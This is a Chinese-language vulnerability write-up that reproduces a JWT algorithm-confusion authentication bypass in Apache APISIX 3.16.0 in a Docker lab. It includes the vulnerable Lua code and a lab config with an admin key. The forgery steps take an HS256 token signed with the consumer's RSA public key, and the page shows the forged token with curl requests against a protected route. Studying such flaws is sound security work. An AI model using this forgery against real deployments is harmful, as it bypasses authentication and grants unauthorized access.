---
title: Apache APISIX 3.16.0 严重 JWT 算法混淆漏洞
description: Apache APISIX 3.16.0 JWT 算法混淆漏洞分析

date: 2026-08-19T20:12:52+08:00
lastmod: 2026-08-23T20:15:52+08:00
---
# Apache APISIX 3.16.0 严重 JWT 算法混淆漏洞

## 漏洞原理

[oss-sec: [CVE request\] Apache APISIX 3.16.0 JWT-Auth Algorithm Confusion (Authentication Bypass, CVSS 9.8 CRITICAL) — no maintainer response in 9 days via GHSA Triage](https://seclists.org/oss-sec/2026/q3/19)

```
## Verification (independent, reproducible)

The PoC at `agents/pentest/workspace/apisix/poc/` builds a real
APISIX 3.16.0 binary, configures a Consumer with `algorithm=RS256`
and a known public key, then:

1. Crafts a JWT with header `{"alg":"HS256","typ":"JWT"}` and
   payload `{"key":"alice","exp":9999999999,"nbf":0}`, signed with
   `HMAC-SHA256(public_key, header_b64 + "." + payload_b64)`.

2. Sends the JWT to a protected endpoint:

   GET /protected HTTP/1.1
   Host: target
   Authorization: Bearer <forged_jwt>

3. APISIX verifies:

   - `get_auth_secret(consumer)` → returns `public_key` (because
     algorithm=RS256).
   - `verify_signature(jwt, public_key)`:
     - `self.header.alg` = `"HS256"` (attacker-controlled).
     - Calls `alg_verify.HS256(data, sig, public_key)`.
     - `HMAC-SHA256(public_key, data) == sig` → TRUE (attacker used
       same key).
   - **Authentication bypassed!**

3/3 PASS on real APISIX 3.16.0 binary. PoC prints
`✅ VULNERABLE: Authentication bypassed as 'alice'`.

## Root cause

The new `parser.lua` has a **mismatch** between the algorithm used to
select the key and the algorithm used to verify the signature:

1. `jwt-auth.lua::get_auth_secret(consumer)` (line 279):

   lua
   if not consumer.auth_conf.algorithm or
      consumer.auth_conf.algorithm:sub(1, 2) == "HS" then
       return get_secret(consumer.auth_conf)  -- HS: returns secret
   else
       return consumer.auth_conf.public_key    -- RS/ES/PS: returns public_key
   end
   
   The key selection uses the **CONFIGURED algorithm** from the consumer.


2. `parser.lua::verify_signature(self, key)` (line 222):

   function _M.verify_signature(self, key)
       return alg_verify[self.header.alg](self.raw_header .. "." ..
                  self.raw_payload, base64_decode(self.signature), key)
   end

   The verification uses the **JWT HEADER's `alg` field**, which is
   **attacker-controlled**.

3. `parser.lua::alg_verify.HS256` (line 116):

   HS256 = function(data, signature, key)
       return signature == alg_sign.HS256(data, key)
   end,

   The HMAC algorithm accepts any string as the key, including a
   PEM-encoded public key.

**The combination allows an attacker to set the JWT header `alg` to
`HS256`, while APISIX provides the consumer's public key (intended
for RS256) to the HMAC verification function.**
```




## 环境搭建

config.yaml

```
  apisix:
    ssl:
      ssl_protocols: TLSv1.2 TLSv1.3
      ssl_session_tickets: false
      ssl_trusted_certificate: /etc/ssl/certs/ca-certificates.crt
      enable: true
      listen:

     - enable_http3: false
       port: 9443
           ssl_ciphers: ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384
         enable_http2: true
         disable_sync_configuration_during_start: false
         worker_startup_time_threshold: 60
         node_listen: 9080
         enable_dev_mode: false
         enable_reuseport: true
         enable_ipv6: true
         extra_lua_path: ''
         extra_lua_cpath: ''
         enable_server_tokens: true
         delete_uri_tail_slash: false
         show_upstream_status_in_response_header: false
         router:
           ssl: radixtree_sni
           http: radixtree_host_uri
         resolver_timeout: 5
         disable_upstream_healthcheck: false
         tracing: false
         lru:
           secret:
       ttl: 300
       neg_ttl: 60
       neg_count: 512
       count: 512
         data_encryption:
           enable_encrypt_fields: true
           keyring:
     - qeddd145sfvddff3
     - edd1c9f0985e76a2
       enable_control: true
         enable_resolv_search_opt: true
         enable_admin: true
         proxy_mode: http
         normalize_uri_like_servlet: false
         proxy_cache:
           cache_ttl: 10s
           zones:
     - disk_path: /tmp/disk_cache_one
       cache_levels: '1:2'
       name: disk_cache_one
       memory_size: 50m
       disk_size: 1G
     - name: memory_cache
       memory_size: 50m
       plugins:

  - real-ip
  - ai
  - client-control
  - proxy-control
  - request-id
  - zipkin
  - ext-plugin-pre-req
  - fault-injection
  - mocking
  - serverless-pre-function
  - cors
  - ip-restriction
  - ua-restriction
  - referer-restriction
  - csrf
  - uri-blocker
  - request-validation
  - chaitin-waf
  - multi-auth
  - openid-connect
  - cas-auth
  - authz-casbin
  - authz-casdoor
  - wolf-rbac
  - ldap-auth
  - hmac-auth
  - basic-auth
  - jwt-auth
  - jwe-decrypt
  - key-auth
  - consumer-restriction
  - attach-consumer-label
  - forward-auth
  - opa
  - authz-keycloak
  - proxy-cache
  - body-transformer
  - ai-prompt-template
  - ai-prompt-decorator
  - ai-prompt-guard
  - ai-rag
  - ai-rate-limiting
  - ai-proxy-multi
  - ai-proxy
  - ai-aws-content-moderation
  - ai-aliyun-content-moderation
  - proxy-mirror
  - proxy-rewrite
  - workflow
  - api-breaker
  - limit-conn
  - limit-count
  - limit-req
  - gzip
  - traffic-split
  - redirect
  - response-rewrite
  - mcp-bridge
  - degraphql
  - kafka-proxy
  - grpc-transcode
  - grpc-web
  - http-dubbo
  - public-api
  - prometheus
  - datadog
  - lago
  - loki-logger
  - elasticsearch-logger
  - echo
  - loggly
  - http-logger
  - splunk-hec-logging
  - skywalking-logger
  - google-cloud-logging
  - sls-logger
  - tcp-logger
  - kafka-logger
  - rocketmq-logger
  - syslog
  - udp-logger
  - file-logger
  - clickhouse-logger
  - tencent-cloud-cls
  - inspect
  - example-plugin
  - aws-lambda
  - azure-functions
  - openwhisk
  - openfunction
  - serverless-post-function
  - ext-plugin-post-req
  - ext-plugin-post-resp
  - ai-request-rewrite
    etcd:
    watch_timeout: 50
    prefix: /apisix
    host:
    - http://etcd:2379
      tls:
      verify: true
      timeout: 30
      startup_retry: 2
      deployment:
      etcd:
      watch_timeout: 50
      prefix: /apisix
      host:
      - http://etcd:2379
        tls:
        verify: true
        timeout: 30
        startup_retry: 2
        role: traditional
        admin:
        enable_admin_ui: true
        allow_admin:
      - 0.0.0.0/0
        admin_api_version: v3
        admin_key:
      - key: kPqtVeoabMGBuydARjLURgRFuidqCEvo
        name: admin
        role: admin
        admin_listen:
        ip: 0.0.0.0
        port: 9180
        enable_admin_cors: true
        admin_key_required: true
        role_traditional:
        config_provider: etcd
        config_provider: etcd
        nginx_config:
        meta:
        lua_shared_dict:
        prometheus-cache: 10m
        upstream-healthcheck: 10m
        status-report: 1m
        standalone-config: 10m
        prometheus-metrics: 15m
        error_log: logs/error.log
        error_log_level: warn
        stream:
        access_log: logs/access_stream.log
        access_log_format: $remote_addr [$time_local] $protocol $status $bytes_sent $bytes_received
        $session_time
        access_log_format_escape: default
        lua_shared_dict:
        worker-events-stream: 10m
        tars-stream: 1m
        etcd-cluster-health-check-stream: 10m
        lrucache-lock-stream: 10m
        plugin-limit-conn-stream: 10m
        enable_access_log: false
        enable_cpu_affinity: false
        worker_rlimit_nofile: 20480
        main_configuration_snippet: ''
        http_configuration_snippet: ''
        http_server_configuration_snippet: ''
        http_server_location_configuration_snippet: ''
        event:
        worker_connections: 10620
        http_end_configuration_snippet: ''
        stream_configuration_snippet: ''
        http:
        charset: utf-8
        variables_hash_max_size: 2048
        enable_access_log: true
        access_log: logs/access.log
        access_log_format: $remote_addr - $remote_user [$time_local] $http_host "$request"
        $status $body_bytes_sent $request_time "$http_referer" "$http_user_agent" $upstream_addr
        $upstream_status $upstream_response_time "$upstream_scheme://$upstream_host$upstream_uri"
        "$apisix_request_id"
        access_log_format_escape: default
        keepalive_timeout: 60s
        upstream:
        keepalive: 320
        keepalive_timeout: 60s
        keepalive_requests: 1000
        client_body_timeout: 60s
        client_max_body_size: 0
        send_timeout: 10s
        underscores_in_headers: 'on'
        real_ip_header: X-Real-IP
        access_log_buffer: 16384
        real_ip_recursive: 'off'
        real_ip_from:
      - 127.0.0.1
      - 'unix:'
        lua_shared_dict:
        plugin-limit-count: 10m
        plugin-limit-count-redis-cluster-slot-lock: 1m
        tracing_buffer: 10m
        plugin-api-breaker: 10m
        discovery: 1m
        jwks: 1m
        introspection: 10m
        access-tokens: 1m
        ext-plugin: 1m
        mcp-session: 10m
        ocsp-stapling: 10m
        cas-auth: 10m
        tars: 1m
        prometheus-metrics: 10m
        internal-status: 10m
        worker-events: 10m
        lrucache-lock: 10m
        balancer-ewma: 10m
        balancer-ewma-locks: 10m
        balancer-ewma-last-touched-at: 10m
        etcd-cluster-health-check: 10m
        plugin-ai-rate-limiting: 10m
        plugin-ai-rate-limiting-reset-header: 10m
        plugin-limit-conn: 10m
        plugin-limit-conn-redis-cluster-slot-lock: 1m
        plugin-limit-req-redis-cluster-slot-lock: 1m
        plugin-limit-req: 10m
        proxy_ssl_server_name: true
        client_header_timeout: 60s
        http_admin_configuration_snippet: ''
        worker_shutdown_timeout: 240s
        worker_processes: auto
        max_pending_timers: 16384
        max_running_timers: 4096
        stream_plugins:
  - ip-restriction
  - limit-conn
  - mqtt-proxy
  - syslog
  - traffic-split
    plugin_attr:
    skywalking:
      report_interval: 3
      service_name: APISIX
      endpoint_addr: http://127.0.0.1:12800
      service_instance_name: APISIX Instance Name
    inspect:
      delay: 3
      hooks_file: /usr/local/apisix/plugin_inspect_hooks.lua
    dubbo-proxy:
      upstream_multiplex_count: 32
    proxy-mirror:
      timeout:
        read: 60s
        connect: 60s
        send: 60s
    opentelemetry:
      trace_id_source: x-request-id
      set_ngx_var: false
      batch_span_processor:
        max_export_batch_size: 16
        drop_on_queue_full: false
        max_queue_size: 1024
        batch_timeout: 2
        inactive_timeout: 1
      collector:
        request_headers:
          Authorization: token
        address: 127.0.0.1:4318
        request_timeout: 3
      resource:
        service.name: APISIX
    server-info:
      report_ttl: 60
    prometheus:
      export_addr:
        ip: 127.0.0.1
        port: 9091
      refresh_interval: 15
      export_uri: /apisix/prometheus/metrics
      metric_prefix: apisix_
      enable_export_server: true
    zipkin:
      set_ngx_var: false
    log-rotate:
      max_kept: 168
      enable_compression: false
      interval: 3600
      timeout: 10000
      max_size: -1
    graphql:
    max_size: 1048576
    ...
```

  


docker-compose.yml

 ```
services:
  etcd:
    image: quay.io/coreos/etcd:v3.5.17
    container_name: apisix-etcd
    command:
      - etcd
      - --name
      - etcd0
      - --data-dir
      - /etcd-data
      - --listen-client-urls
      - http://0.0.0.0:2379
      - --advertise-client-urls
      - http://0.0.0.0:2379
      - --enable-v2=true
    ports:
      - "2379:2379"

  apisix:
    image: apache/apisix:3.16.0-debian
    container_name: apisix
    depends_on:
      - etcd
    volumes:
      - ./config.yaml:/usr/local/apisix/conf/config.yaml
    ports:
      - "9080:9080"
      - "9180:9180"
 ```


使用docker compose up -d拉起后测试鉴权

```
curl.exe http://127.0.0.1:9180/apisix/admin/routes -H "X-API-KEY: kPqtVeoabMGBuydARjLURgRFuidqCEvo"
```


返回

```
{"total":0,"list":[]}
```


鉴权成功

## 漏洞POC 复现

```
`parser.lua::verify_signature(self, key)` 第 222 行

function _M.verify_signature(self, key)
    return alg_verify[self.header.alg](self.raw_header .. "." ..
               self.raw_payload, base64_decode(self.signature), key)
end
```


在此处签名验证时所使用的算法来自self.signature

那么只需要控制JWT header里的alg字段就可以修改签名加密方式

```
parser.lua::alg_verify.HS256 line:116 

HS256 = function(data, signature, key)
    return signature == alg_sign.HS256(data, key)
end,
```


HMAC 算法会接受任意字符串作为密钥，包括一个 PEM 编码的公钥。



那么意味着我只需要把RSA的公钥当作HS256的密钥上传，就bingo了

```
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem



-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvZQPhD3MOVBbBkV0XBvw
194iWfPBWQPF5PS7Uv6FjVdyuS7NWbZ/FTYZiALODys+cO78RAtt24RgFGPKXyNd
Iv8agduD8868cEJzWpJXI8WG6q0QsR11zaS6Q3dQF7tEEu83lh7qoEKGhszpgEaJ
xtK9U7ROuhJ5EzgwadD7eUZIyla5LRMTrjG9W1ot0N3dEm+yn+/84lC6qsavh23L
9cVtb6ddgXmqYJ4YFCuGOgIpLoGEInlLaJKzjc5q5scwF3/rLwYuu3PRttMG9tBS
V6hWmm16A8x7+Xh+TgaMAt+gLMFG7iCP6ASSWwSjq7KgpAwHkNwMvlMzyfUVlEyk
6QIDAQAB
-----END PUBLIC KEY-----



{
  "username": "alice",
  "plugins": {
    "jwt-auth": {
      "key": "alice",
      "algorithm": "RS256",
      "public_key": "-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvZQPhD3MOVBbBkV0XBvw
194iWfPBWQPF5PS7Uv6FjVdyuS7NWbZ/FTYZiALODys+cO78RAtt24RgFGPKXyNd
Iv8agduD8868cEJzWpJXI8WG6q0QsR11zaS6Q3dQF7tEEu83lh7qoEKGhszpgEaJ
xtK9U7ROuhJ5EzgwadD7eUZIyla5LRMTrjG9W1ot0N3dEm+yn+/84lC6qsavh23L
9cVtb6ddgXmqYJ4YFCuGOgIpLoGEInlLaJKzjc5q5scwF3/rLwYuu3PRttMG9tBS
V6hWmm16A8x7+Xh+TgaMAt+gLMFG7iCP6ASSWwSjq7KgpAwHkNwMvlMzyfUVlEyk
6QIDAQAB
-----END PUBLIC KEY-----
"
    }
  }
}
```


现在的状态是

```
Consumer:
alice
 └── jwt-auth
      algorithm = RS256
      public_key = RSA public key

Route:
/protected
 └── jwt-auth
```


如果我直接

```
$ curl http://host.docker.internal:9080/protected
```


就会

```
{"message":"Missing JWT token in request"}
```


但我用公钥伪造一个jwt

```
┌──(ecx㉿wxz)-[/mnt/d/CTF/hack/CVE/Apache APISIX 3.16.0 严重 JWT 算法混淆漏洞/apisix-jwt-lab]
└─$ python3 poc.py
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhbGljZSIsImV4cCI6OTk5OTk5OTk5OX0.eYI8FZhDHTEBS_7NveXqkN6Q-yQEEndrEzcPIyRxQt4



┌──(ecx㉿wxz)-[/mnt/d/CTF/hack/CVE/Apache APISIX 3.16.0 严重 JWT 算法混淆漏洞/apisix-jwt-lab]
└─$ curl "http://host.docker.internal:9080/protected" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhbGljZSIsImV4cCI6OTk5OTk5OTk5OX0.eYI8FZhDHTEBS_7NveXqkN6Q-yQEEndrEzcPIyRxQt4"

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.</p>


┌──(ecx㉿wxz)-[/mnt/d/CTF/hack/CVE/Apache APISIX 3.16.0 严重 JWT 算法混淆漏洞/apisix-jwt-lab]
└─$ curl "http://host.docker.internal:9080/protected" -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJhbGljZSIsImV4cCI6OTk5OTk5OTk5OX0.eYI8FZhDHTEBS_7NveXqkN6Q-yQEEndrEzcPIyRxQ55"
{"message":"failed to verify jwt"}
```


可以看到成功绕过了签名验证

